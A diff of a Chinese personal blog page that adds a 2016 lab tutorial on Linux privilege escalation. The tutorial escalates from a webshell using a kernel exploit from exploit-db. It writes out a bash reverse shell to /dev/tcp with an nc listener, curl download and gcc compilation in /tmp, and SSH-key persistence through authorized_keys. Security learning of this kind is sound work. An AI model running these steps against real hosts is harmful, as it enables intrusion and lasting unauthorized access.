@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Tag: redis | 大棟哥の博客</title>
+  <title>Linux提权 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -84,7 +84,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -262,37 +262,70 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-
-
-<section id="services">
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/08/02/中间件漏-redis/">中间件漏洞之Redis</a></h4>
-                            
-                            <p><time datetime="2016-08-02T10:09:10.000Z"><a href="/2016/08/02/中间件漏-redis/">2016-08-02</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2016-08-08T15:23:20.000Z" itemprop="datePublished">
+          2016-08-08
+      </time>
+    
+    
+    | 
+    <a href='/tags/Linux/'>Linux</a>
+    
+    
+</span>
+                <h1>Linux提权</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<p>前边学完了windows提权，今天学一下Linux下边的提权</p>
+<h2 id="一、Linux服务器提权"><a href="#一、Linux服务器提权" class="headerlink" title="一、Linux服务器提权"></a>一、Linux服务器提权</h2><h3 id="0x00【实验环境】"><a href="#0x00【实验环境】" class="headerlink" title="0x00【实验环境】"></a>0x00【实验环境】</h3><p>目标服务器IP：10.22.5.70</p>
+<h3 id="0x01【整体思路】"><a href="#0x01【整体思路】" class="headerlink" title="0x01【整体思路】"></a>0x01【整体思路】</h3><p>1、拿到webshell之后，登录后台，查看当前用户权限；<br>2、若是低权限，查看主机版本，找对应版本的exp进行利用；<br>3、执行脚本，进行提权。</p>
+<h3 id="0x02【试验流程】"><a href="#0x02【试验流程】" class="headerlink" title="0x02【试验流程】"></a>0x02【试验流程】</h3><p>1、登录后台查看一下基本的功能，找到执行命令交互的地方，查看一下当前用户的权限，是Apache低权限：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%871.jpg?raw=true" alt="image"></p>
+<p>2、接下来查看一下系统版本，版本有发行版本和内核版本，发行版本就是发行商设定的版本，内核版本就是生产商设定的版本：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%872.jpg?raw=true" alt="image"></p>
+<p>3、找对应系统版本存在漏洞的exp:<br>搜索地址：<a href="https://www.exploit-db.com/exploits/35370/" target="_blank" rel="external">https://www.exploit-db.com/exploits/35370/</a><br>找到的结果如下，可以下载第二个进行利用，第二个对应的我们目标主机系统的版本：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%873.jpg?raw=true" alt="image"></p>
+<p>4、反弹shell对其进行编译利用：<br>在本机进行端口监听，主机ip为：10.22.100.10<br>目标主机的ip为10.22.5.70，首先在主机上监听4444端口，<br>在主机上执行：nc -l 4444<br>在目标主机上执行：/bin/bash -i &gt;&amp; /dev/tcp/10.22.100.10/4444 0&lt;&amp;1<br>下图为成功监听的结果：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%874.jpg?raw=true" alt="image"></p>
+<p>5、将exp下载到目标主机上：<br>由于权限原因wget下载命令使用不了，可以发现curl可以使用：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%875.jpg?raw=true" alt="image"></p>
+<p>6、这个时候要注意的是由于权限很低，对文件的操作受限制，就会出现下述的这种情况：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%876.jpg?raw=true" alt="image"></p>
+<p>这里我们要找到一个任何用户都有权限的目录，将exp下载下来利用<br>这个时候就想到Linux上边有一个tmp目录任意用户都有可读可写的权限，切换进去进行下载，可以发现下载完成：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%877.jpg?raw=true" alt="image"></p>
+<p>7、使用GCC进行编译查看gcc版本，进行编译：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%878.jpg?raw=true" alt="image"></p>
+<p>8、最终结果：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%879.jpg?raw=true" alt="image"></p>
+<h2 id="二、【免密码登录】"><a href="#二、【免密码登录】" class="headerlink" title="二、【免密码登录】"></a>二、【免密码登录】</h2><p>1、在主机上生成公约和私钥，公钥放到目标主机的authorized_keys文件中，私钥用于连接目标主机的凭证：<br>ssh-keygen -t rsa -P ‘’一路回车<br>注意‘P’为大写：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%8710.jpg?raw=true" alt="image"></p>
+<p>2、将生成的公钥考到目标主机的指定文件中：<br>使用echo命令追加到authorized_keys中<br>    ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAneXPqMxcYZPpvykNDcvoNh28rgEvBgzVlz5lyB9+fY0suU0gjCB0Tpaq0dH9DavsllYRK6ZJTaVuaQQ8elVSbFCQ+GHLh/MOJjGNwytirK1skJ83xWtyNTkj9lDgqcYFEsP1BHst/QpI3y1eWebbBQsAiCFz9saeX3no4tTzqXIRhT7UfriPHbixJYNQqxk3d4VvOetH2Sd/zshp8prW/mNK8rKM5+y4QYhaz3Ha23mUSaxeQkrPC31C3/qffwNVDVOFCcy6CSeohTA0o9uWGOgFMaUsmmFOVdIO3oUxC2skM1uEtcYgEB2uQyCkmnaehtrd14c3OMpIKzieouOvAQ== root@localhost.localdomain<br>成功连接：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/linux%E6%8F%90%E6%9D%83/%E5%9B%BE%E7%89%8711.jpg?raw=true" alt="image"></p>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>业精于勤，荒于嬉；行成于思，毁于随。</p>
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="pagination" role="pagination">
+    
+    
+    <a class="pull-right" href="/2016/08/05/windows提权/">
+        Windows提权 →
+    </a>
+    
+</nav>
+
+        <div class="duoshuo">
+<div class="ds-thread" data-thread-key="2016/08/08/Linux提权/" data-title="Linux提权" data-url="http://www.jiadong.xin/2016/08/08/Linux提权/"></div>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"duoshuo_name"};
+(function() {
+	var ds = document.createElement('script');
+	ds.type = 'text/javascript';ds.async = true;
+	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	ds.charset = 'UTF-8';
+	(document.getElementsByTagName('head')[0] 
+	 || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+</div>
     </div>
 </section>
+
+
       
 <!-- ============================ Footer =========================== -->
 
